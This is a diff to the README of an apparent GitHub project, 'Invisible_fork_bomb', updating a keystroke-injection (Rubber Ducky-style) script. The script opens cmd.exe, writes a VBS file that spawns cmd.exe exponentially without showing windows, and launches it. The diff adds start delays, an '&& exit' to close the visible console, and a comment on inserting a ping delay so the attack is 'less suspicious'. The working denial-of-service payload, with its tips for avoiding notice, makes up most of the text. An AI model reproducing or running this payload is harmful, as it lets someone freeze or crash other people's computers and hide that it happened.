@@ -4,12 +4,14 @@ The script creates and starts a vbs that executes exponentially cmd.exe without 
 # About...
 Author: [BlueArduino20](https://github.com/BlueArduino20/)
 
-Version 1.0
+Version 2.0
 
 Repository: [https://github.com/BlueArduino20/Invisible_fork_bomb](https://github.com/BlueArduino20/Invisible_fork_bomb)
 
 # Code
 <pre><code>
+DELAY 1000
+REM ^ You should set more delay time if your computer is slow or if the script doesn't work correctly.
 GUI r
 DELAY 500
 STRING cmd
@@ -25,8 +27,7 @@ STRING loop
 CTRL z
 ENTER
 DELAY 50
-REM STRING ping localhost -n 10
-REM You can uncomment this ^ to delay 10 seconds before starting the fork bomb. (By this way it's less suspicious)
-STRING start forkb.vbs
+STRING start forkb.vbs && exit
+REM You can add this: ">null ping localhost -n 5 && " before "start" to make a (5 sec) delay before the vbs execution. (By this way it's less suspicious)
 ENTER
 </pre></code>
